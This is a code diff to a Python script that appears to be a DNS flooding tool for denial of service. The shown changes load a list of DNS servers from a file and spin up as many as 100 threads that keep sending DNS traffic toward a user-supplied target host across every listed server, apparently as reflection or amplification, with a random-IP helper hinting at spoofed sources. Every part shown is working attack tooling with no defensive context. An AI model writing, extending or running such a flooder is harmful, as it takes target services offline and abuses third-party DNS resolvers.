@@ -8,6 +8,10 @@ sent = 0
 active_threads = 0
 max_threads = 100
 
+with open("dnsservers.txt") as file:
+    dns_servers = file.read().splitlines()
+    file.close()
+
 def random_ip():
     ip = []
     for _ in range(4):
@@ -41,14 +45,27 @@ def dns(host, dns_server="1.1.1.1"):
         active_threads -= 1
 
 def verbose():
+    try:
+        while True:
+            time.sleep(1)
+            print(f"Sent -> {sent}")
+    except KeyboardInterrupt:
+        exit()
+
+
+def flood_initializer(host: str) -> None:
     while True:
-        time.sleep(1)
-        print(f"Sent -> {sent}")
+        for dns_server in dns_servers:
+            while True:
+                if active_threads >= max_threads:
+                    continue
+                threading.Thread(target=dns, args=[host, dns_server], daemon=True).start()
+                break
 
-host = input("Host: ")
+def main():
+    host = input("Host: ")
+    threading.Thread(target=flood_initializer, args=[host], daemon=True).start()
+    verbose()
 
-threading.Thread(target=verbose, daemon=True).start()
-while True:
-    if active_threads >= max_threads:
-        continue
-    threading.Thread(target=dns, args=[host], daemon=True).start()
+if __name__ == "__main__":
+    main()
